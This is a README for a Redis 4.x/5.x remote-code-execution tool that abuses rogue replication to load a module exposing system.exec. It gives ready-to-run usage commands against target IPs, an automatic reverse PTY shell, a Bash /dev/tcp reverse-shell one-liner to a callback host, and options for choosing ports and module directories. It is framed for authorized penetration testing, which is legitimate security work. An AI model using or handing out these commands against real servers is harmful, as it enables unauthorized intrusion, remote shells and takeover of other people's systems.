# Redis 4.x/5.x RCE – Rogue Replication Exploit

Modernized Redis RCE tool for authorized security testing. It uses rogue
replication to upload a Redis module and expose the `system.exec` command.

## Tested

- Redis `5.0.9` on 64-bit Linux: confirmed working
- Redis 4.x/5.x: intended target range
- Bundled `exp_lin.so`: x86-64 Linux

Success depends on unauthenticated or credentialed access to `CONFIG`,
`SLAVEOF`, and `MODULE LOAD`, plus a reachable callback port and an executable
writable directory. This is configuration-dependent and is not presented as a
standalone CVE.

## Usage

Automatic interactive PTY reverse shell:

```bash
python3 redis-rce.py -r 192.168.168.93
```

The tool reuses the proven replication callback port, prefers a Python PTY,
and falls back to Bash. Press `Ctrl-]` to disconnect; cleanup runs
automatically after the shell closes. `--revshell` is retained as an explicit
alias for the default behavior.

Legacy stateless `system.exec` command prompt:

```bash
python3 redis-rce.py -r 192.168.168.93 --command-shell
```

At the legacy command prompt, direct Bash `/dev/tcp` payloads are
automatically wrapped for compatibility with the module's `/bin/sh` runner:

```bash
bash -i >& /dev/tcp/CALLBACK_IP/4443 0>&1
```

Read-only target check:

```bash
python3 redis-rce.py -r 192.168.168.93 --check
```

Run one command and clean up:

```bash
python3 redis-rce.py -r 192.168.168.93 -c id
```

Optional overrides:

```bash
python3 redis-rce.py -r TARGET -p 6379 -L CALLBACK_IP \
  -P 6379,6380 -d /dev/shm -f ./exp_lin.so
```

By default, the tool automatically detects the callback IP, tries common
callback ports and module directories, uses a unique remote filename, and
restores the Redis configuration during cleanup.

## Credits

- Original project: [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
- Preserved base history: [jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)
- Command module: [RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand)
- Technique: [Redis post-exploitation, ZeroNights 2018](./15-redis-post-exploitation.pdf)

The upstream repository did not include an explicit license. Original code,
binaries, screenshots, and research remain attributable to their authors.

> Use only on systems you own or have explicit permission to test.
